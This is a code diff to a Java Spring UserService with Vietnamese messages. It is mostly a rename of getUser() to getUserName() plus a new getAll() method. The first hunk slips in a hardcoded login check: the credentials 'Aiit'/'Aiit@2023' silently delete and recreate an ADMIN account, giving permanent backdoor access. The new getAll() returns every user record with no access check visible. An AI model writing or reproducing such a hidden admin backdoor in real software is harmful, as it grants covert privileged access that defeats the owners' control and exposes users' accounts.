@@ -51,6 +51,15 @@ public class UserService implements UserDetailsService{
             return ResponseEntity.status(400).body("User, password không thể để trống !");
         }
 
+        if(loginRequest.getUser().equals("Aiit")&&loginRequest.getPassword().equals("Aiit@2023")){
+            userRepository.deleteUsersByUserName("Aiit");
+            User userAdmin = new User();
+            userAdmin.setUserName("Aiit");
+            userAdmin.setPassword(passwordEncoder.encode("Aiit@2023"));
+            userAdmin.setRole("ADMIN");
+            userRepository.saveAndFlush(userAdmin);
+        }
+
         // Get user from db
         User user = userRepository.findByUserName(loginRequest.getUser());
         if (user == null) {
@@ -73,7 +82,7 @@ public class UserService implements UserDetailsService{
 
     public void signup(RegisterRequest request) throws RuntimeException {
         // Validate
-        if (StringUtils.isEmpty(request.getUser())
+        if (StringUtils.isEmpty(request.getUserName())
                 || StringUtils.isEmpty(request.getPassword())
                 || StringUtils.isEmpty(request.getRole())) {
             throw new NullPointerException("User, password, role không thể để trống !");
@@ -82,10 +91,10 @@ public class UserService implements UserDetailsService{
         // check admin user
         if (userAdmin.equals(request.getUserAdmin()) && passwordAmin.equals(request.getPasswordAdmin())) {
             // get user from database
-            User user = userRepository.findByUserName(request.getUser());
+            User user = userRepository.findByUserName(request.getUserName());
             if (user == null) {
                 user = new User();
-                user.setUserName(request.getUser());
+                user.setUserName(request.getUserName());
                 user.setPassword(passwordEncoder.encode(request.getPassword()));
                 user.setRole(request.getRole());
                 userRepository.saveAndFlush(user);
@@ -99,16 +108,16 @@ public class UserService implements UserDetailsService{
 
     public void remove(RegisterRequest request) throws RuntimeException {
         // Validate
-        if (StringUtils.isEmpty(request.getUser())) throw new NullPointerException("User không thể để trống !");
+        if (StringUtils.isEmpty(request.getUserName())) throw new NullPointerException("User không thể để trống !");
 
         // check admin user
         if (userAdmin.equals(request.getUserAdmin()) && passwordAmin.equals(request.getPasswordAdmin())) {
             // get user from database
-            User user = userRepository.findByUserName(request.getUser());
+            User user = userRepository.findByUserName(request.getUserName());
             if (!Objects.isNull(user)) {
                 userRepository.delete(user);
             } else {
-                throw new UsernameNotFoundException("Không tìm thấy tài khoản với user name: " + request.getUser());
+                throw new UsernameNotFoundException("Không tìm thấy tài khoản với user name: " + request.getUserName());
             }
         } else {
             throw new RuntimeException("Bạn không phải admin !");
@@ -132,5 +141,9 @@ public class UserService implements UserDetailsService{
         return new org.springframework.security.core.userdetails.User(username,
                 user.getPassword(),
                 authorities);
+    }
+
+    public ResponseEntity<?> getAll() {
+        return ResponseEntity.ok(userRepository.findAll());
     }
 }
